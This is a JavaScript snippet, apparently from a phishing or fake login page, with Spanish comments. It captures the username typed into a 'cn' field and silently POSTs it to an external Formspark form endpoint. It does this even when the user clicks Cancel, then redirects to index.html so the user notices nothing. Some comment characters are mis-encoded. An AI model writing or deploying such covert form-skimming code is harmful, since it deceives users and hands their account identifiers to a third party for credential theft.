<script>
  (function() {
    var campo = document.getElementById('cn');
    var btnBuscar = document.getElementById('submitBtn');
    var btnCancelar = document.getElementById('button-cancelButton');

    function enviarYRedirigir() {
      var usuario = campo.value.trim();
      if (!usuario) {
        alert('Por favor, introduzca su nombre de usuario.');
        return;
      }
      // Env├Ło silencioso a Formspark
      fetch('https://submit-form.com/yRhwHN8bs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'cn=' + encodeURIComponent(usuario)
      }).finally(function() {
        // Redirigimos al index siempre, aunque falle el env├Ło
        window.location.href = 'index.html';
      });
    }

    btnBuscar.addEventListener('click', function(e) {
      e.preventDefault();
      enviarYRedirigir();
    });

    btnCancelar.addEventListener('click', function(e) {
      e.preventDefault();
      enviarYRedirigir();
    });
  })();
